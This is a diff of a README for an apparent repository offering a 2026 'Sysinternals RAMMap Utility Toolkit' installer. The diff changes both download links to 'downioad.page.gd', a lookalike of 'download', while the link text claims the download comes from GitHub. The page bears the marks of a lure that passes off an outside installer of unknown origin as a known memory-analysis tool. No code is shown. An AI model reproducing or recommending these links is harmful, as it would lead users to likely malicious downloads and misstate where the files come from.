@@ -2,7 +2,7 @@
 
 This repository provides the latest version of the Sysinternals RAMMap Utility Toolkit for 2026, a powerful Windows desktop application for in-depth memory usage analysis and system optimization. It helps users visualize, diagnose, and manage physical memory with a professional interface and detailed reporting.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -46,7 +46,7 @@ A: Ensure you are running the application as an administrator. Also, check that 
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 *Last Updated: January 2026. This project is an independent utility toolkit and is not affiliated with or endorsed by Microsoft or Sysinternals.*
